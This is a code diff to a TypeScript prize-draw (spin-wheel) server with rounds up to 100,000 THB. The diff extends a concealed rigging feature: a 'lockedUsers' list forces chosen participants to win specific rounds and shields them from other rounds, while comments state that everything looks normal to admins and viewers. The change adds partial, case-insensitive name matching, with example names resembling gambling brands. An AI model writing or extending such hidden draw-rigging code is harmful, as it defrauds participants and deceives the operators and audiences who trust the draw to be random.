@@ -10,9 +10,15 @@ import { IRound, IParticipant, SpinRequest, SpinResult, AdminState } from '../ty
 // When spinning the matching round, this user will ALWAYS win.
 // In other rounds, this user is excluded from the random pool (protected).
 // Everything looks normal to admin and viewers.
+// Uses partial match: { user: 'AMEI' } matches "OD-AMEI-TT-789BET", "AMEI-789BET", "AMEI-OKVIP", etc.
 const lockedUsers: { user: string; prize: number }[] = [
-  // { user: 'ชื่อคน', prize: 2 },
+  // { user: 'AMEI', prize: 2 },
 ];
+
+// Check if participant name contains the locked user keyword (case-insensitive)
+const isLockedUser = (participantName: string, lockKeyword: string): boolean => {
+  return participantName.toUpperCase().includes(lockKeyword.toUpperCase());
+};
 
 const defaultRounds = (sessionId: mongoose.Types.ObjectId): object[] => [
   { sessionId, roundNumber: 1, prize: '100,000 THB', prizeAmount: 100000, totalWinners: 1, totalSpins: 1, remainingSpins: 1 },
@@ -220,28 +226,26 @@ export default async function apiRoutes(fastify: FastifyInstance) {
       const participants = await Participant.find({ sessionId, hasWon: false }).sort({ name: 1 });
       if (participants.length === 0) { fastify.setSpinLock(false); return reply.status(400).send({ error: 'No participants available' }); }
 
-      // Check if there's a locked user for this round
+      // Check if there's a locked user for this round (partial match)
       const lockForRound = lockedUsers.find(l => l.prize === roundNumber);
       let winnerIndex: number;
 
       if (lockForRound) {
-        // Find the locked user in the participant list
-        const lockedIdx = participants.findIndex(p => p.name === lockForRound.user);
+        // Find the locked user in participant list using partial match
+        const lockedIdx = participants.findIndex(p => isLockedUser(p.name, lockForRound.user));
         if (lockedIdx >= 0) {
           // Locked user found — they win this round
           winnerIndex = lockedIdx;
         } else {
           // Locked user not found (already won or not in list) — fall back to random
           // Exclude other locked users from the pool
-          const lockedNames = new Set(lockedUsers.map(l => l.user));
-          const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedNames.has(x.p.name));
+          const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedUsers.some(l => isLockedUser(x.p.name, l.user)));
           const pick = eligible.length > 0 ? eligible[Math.floor(Math.random() * eligible.length)] : { i: Math.floor(Math.random() * participants.length) };
           winnerIndex = pick.i;
         }
       } else {
         // No lock for this round — random pick, but exclude locked users
-        const lockedNames = new Set(lockedUsers.map(l => l.user));
-        const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedNames.has(x.p.name));
+        const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedUsers.some(l => isLockedUser(x.p.name, l.user)));
         const pick = eligible.length > 0 ? eligible[Math.floor(Math.random() * eligible.length)] : { i: Math.floor(Math.random() * participants.length) };
         winnerIndex = pick.i;
       }
